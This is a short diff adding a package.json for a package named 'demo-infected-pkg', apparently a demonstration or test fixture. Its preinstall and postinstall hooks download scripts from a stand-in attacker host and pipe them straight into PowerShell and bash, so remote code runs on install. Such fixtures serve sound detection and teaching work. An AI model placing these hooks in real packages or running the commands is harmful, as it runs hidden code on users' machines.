@@ -1,0 +1,9 @@
+{
+  "name": "demo-infected-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "iwr -useb https://evil.example.test/s.ps1 | iex",
+    "postinstall": "curl -fsSL https://evil.example.test/setup.sh | bash",
+    "test": "echo no tests"
+  }
+}
